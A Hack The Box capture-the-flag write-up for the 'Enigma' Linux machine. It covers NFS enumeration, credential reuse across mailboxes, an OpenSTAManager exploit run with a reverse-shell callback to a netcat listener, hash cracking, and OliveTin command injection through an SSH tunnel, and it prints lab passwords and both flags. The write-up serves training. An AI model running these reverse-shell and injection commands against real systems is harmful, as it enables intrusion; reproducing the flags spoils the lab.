<div align="center">

# ENIGMA

### Hack The Box · Linux · Easy

![Platform](https://img.shields.io/badge/Platform-Hack%20The%20Box-9fef00?style=for-the-badge&logo=hackthebox&logoColor=black)
![OS](https://img.shields.io/badge/OS-Linux-555?style=for-the-badge&logo=linux&logoColor=white)
![Status](https://img.shields.io/badge/Writeup-Complete-2ea44f?style=for-the-badge)

**NFS exposure → reused mail credentials → OpenSTAManager RCE → database password recovery → OliveTin command injection**

</div>

> [!CAUTION]
> **Spoilers:** this page contains the full solution and both flags. Use it as a reference after attempting the machine yourself.

## Contents

- [Overview](#overview)
- [1 · Enumeration](#1--enumeration)
- [2 · Initial access](#2--initial-access)
- [3 · From `www-data` to `haris`](#3--from-www-data-to-haris)
- [4 · User access](#4--user-access)
- [5 · Privilege escalation](#5--privilege-escalation)
- [Takeaways](#takeaways)

## Overview

The foothold comes from information exposed over NFS. A document provides a mail account, and password reuse leads to a more privileged mailbox containing OpenSTAManager credentials. A vulnerable application gives a shell as `www-data`; credentials recovered from its database lead to `haris`. Finally, a local OliveTin instance can be reached through an SSH tunnel and abused to execute a command as root.

| Property | Value |
|:--|:--|
| Target | `enigma.htb` |
| Operating system | Linux |
| Difficulty | Easy |
| Initial access | OpenSTAManager RCE (CVE-2025-69212) |
| Privilege escalation | OliveTin command injection (CVE-2026-27626) |

## 1 · Enumeration

The initial scan reveals a web server, mail services, SSH, and NFS. The NFS export is the most promising lead because it is accessible without credentials.

```bash
nmap -sC -sV -T5 --min-parallelism 10 --max-retries 4 --max-rtt 300ms \
  -oN nmap_scan.txt <TARGET_IP>
```

| Port | Service | Notes |
|---:|:--|:--|
| 22 | SSH | OpenSSH 9.6p1 |
| 80 | HTTP | nginx; redirects to `enigma.htb` |
| 110, 995 | POP3 | Dovecot |
| 143, 993 | IMAP | Dovecot |
| 111 | rpcbind | NFS-related RPC services |
| 2049 | NFS | NFSv4 export available |

Add the target hostname locally so the virtual host resolves:

```bash
echo '<TARGET_IP> enigma.htb' | sudo tee -a /etc/hosts
```

Virtual-host fuzzing identifies `mail001.enigma.htb`, which serves Roundcube Webmail:

```bash
ffuf -u http://enigma.htb/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -H 'Host: FUZZ.enigma.htb' -fs 154
```

Add the discovered host as well:

```text
<TARGET_IP> mail001.enigma.htb
```

No useful Roundcube version vulnerability was identified, so continue with NFS.

### NFS share

Mount the export and inspect its contents:

```bash
sudo mkdir -p /mnt/enigma
sudo mount -t nfs -o vers=4.2 enigma.htb:/ /mnt/enigma
find /mnt/enigma -maxdepth 5 -type f
```

Among the files is a PDF with onboarding details for Kevin Mitchell. It includes the Roundcube URL and the initial credentials:

```text
Username: kevin
Password: Enigma2024!
```

## 2 · Initial access

Log in to Roundcube as `kevin`. A welcome email from Sarah points to another account. The same default password works for `sarah`, demonstrating password reuse across mail accounts.

The IT email in Sarah's mailbox provides the OpenSTAManager credentials and identifies `support_001.enigma.htb` as the application host.

```text
admin : Ne3s4rtars78s
```

Add the hostname to `/etc/hosts` if it does not resolve:

```text
<TARGET_IP> support_001.enigma.htb
```

Sarah's mailbox contains OpenSTAManager credentials:

The application identifies itself as OpenSTAManager `2.9.8 (5ff39df9b)`. The writeup uses a public proof of concept for [CVE-2025-69212](https://github.com/BridgerAlderson/CVE-2025-69212-PoC) to obtain command execution.

Start a listener on the attacking machine:

```bash
nc -lvnp 9001
```

Run the exploit, replacing the callback address with your VPN or tun interface IP:

```bash
python3 exploit.py \
  -t http://support_001.enigma.htb/ \
  -u admin -p 'Ne3s4rtars78s' \
  --reverse-shell <CALLBACK_IP> 9001
```

The reverse shell runs as `www-data`.

## 3 · From `www-data` to `haris`

The web application's `config.inc.php` contains database connection details:

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

The `zz_users` table contains bcrypt password hashes. Save the `haris` hash to a file and run Hashcat with `rockyou.txt`:

```bash
printf '%s\n' '$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC' > haris.hash
hashcat -m 3200 -a 0 haris.hash /usr/share/wordlists/rockyou.txt
```

The recovered password is `bestfriends`. Use it to switch to `haris` from the reverse shell:

```bash
su haris
```

SSH password authentication is disabled, so `su` provides the transition to the local account.

## 4 · User access

As `haris`, retrieve the user flag:

```bash
cat ~/user.txt
```

```text
6b11ef880e088f05e8dc192cbb095c7a
```

The original session established persistent SSH access by creating a key pair as `haris`, adding the public key to `~/.ssh/authorized_keys`, and using the private key from the attacking machine. Keep private keys protected and transfer them only through a channel you control.

## 5 · Privilege escalation

Inspecting `/opt` reveals OliveTin and its `config.yaml`. The service listens on port `1337` and exposes a backup action that invokes `/opt/backupScript.sh`:

```yaml
listenAddressSingleHTTPFrontend: 0.0.0.0:1337

- title: Run backup script
  shell: /opt/backupScript.sh
  shellAfterCompleted: "apprise -t 'Notification: Backup script completed' -b 'The backup script completed with code {{ exitCode}}. The log is: \n {{ output }} '"
  maxConcurrent: 1
  timeout: 10
  icon: backup
  popupOnStart: execution-dialog
```

The configured script is not present and `haris` cannot write to `/opt`. The OliveTin version is vulnerable to command injection (CVE-2026-27626). Forward the local service port over SSH:

```bash
ssh -L 1337:127.0.0.1:1337 haris@enigma.htb
```

With the tunnel open, use the [CVE-2026-27626 proof of concept](https://github.com/0xh7ml/CVE-2026-27626-PoC) to read the root flag:

```bash
python3 CVE-2026-27626.py -u 127.0.0.1 -p 1337 -x 'cat /root/root.txt'
```

The command output includes:

```text
81ff987d2fff259e50014a3338994278
```

## Flags

| User | Root |
|:--|:--|
| `6b11ef880e088f05e8dc192cbb095c7a` | `81ff987d2fff259e50014a3338994278` |

## Takeaways

- Check NFS exports early; they can expose files that reveal valid credentials.
- Test for password reuse between accounts, while treating any recovered credentials as sensitive.
- Configuration files and application databases often provide the next pivot.
- Inspect local services and their configuration when moving from a user shell toward root.

<div align="center">

`enumerate carefully` · `follow the evidence` · `learn responsibly`

</div>
